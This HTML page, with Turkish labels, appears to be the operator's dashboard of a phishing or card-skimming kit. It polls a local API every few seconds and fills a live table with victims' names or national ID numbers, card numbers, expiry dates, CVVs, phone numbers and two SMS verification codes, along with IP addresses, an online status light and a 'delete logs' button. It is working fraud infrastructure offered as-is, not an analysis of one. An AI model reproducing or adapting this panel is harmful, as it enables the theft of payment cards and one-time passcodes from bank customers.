<!DOCTYPE html>
<html>
<head>
    <title>Info Tablosu</title>

	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
   <div class="row">
                            <div class="col-md-12">
                                <div class="main-card mb-3 card">
                                    <div class="card-header">Active Users
                                        <div class="btn-actions-pane-right">
                                            <div role="group" class="btn-group-sm btn-group">
                                                <button class="active btn btn-focus"  id="delete-logs-button">LoglarÄ± Sil</button>
                                                
                                            </div>
                                        </div>
                                    </div>
                                    <div class="table-responsive">
                                        <table class="align-middle mb-0 table table-borderless table-striped table-hover">
        <thead>
            <tr>
               
                <th>Ad</th>
                <th>Kart No</th>
                <th>Son Kul</th>
                <th>CVV</th>
              
                <th>Tel No</th>
              
                <th>SMS</th>
                <th>SMS2</th>
                <th>Durum</th>
                <th>Page</th>
                <th>Notification 1</th>
                <th>Notification 2</th>
             
                <th>Date</th>
                <th>IP</th>
            </tr>
        </thead>
        <tbody id="infoTableBody">
         </tbody>
    </table>

     <script>
        function fetchDataAndPopulateTable() {
    fetch('/api-info')
        .then(response => response.json())
        .then(data => {
            const infoTableBody = document.getElementById('infoTableBody');
           
            infoTableBody.innerHTML = '';

            data.forEach(info => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${info.tckn}</td>
                    <td>${info.cardnumber}</td>
                    <td>${info.exp}</td>
                    <td>${info.cvv}</td>
                   
                    <td>${info.phone}</td>
                    <td>${info.sms}</td>
                    <td>${info.sms2}</td>
                    <td>${info.active_status < Math.floor(Date.now() / 1000) ? 'ðŸ”´' : 'ðŸŸ¢'}</td>
                    <td>${info.page}</td>
                    <td>${info.notif1}</td>
                    <td>${info.notif2}</td>
                    <td>${info.now_date}</td>
                    <td>${info.ip}</td>
                `;
                infoTableBody.appendChild(row);
            });
        });
}
fetchDataAndPopulateTable();
setInterval(fetchDataAndPopulateTable, 2800);

    </script>
	  </div>
	 </div>
	</div>

</body>
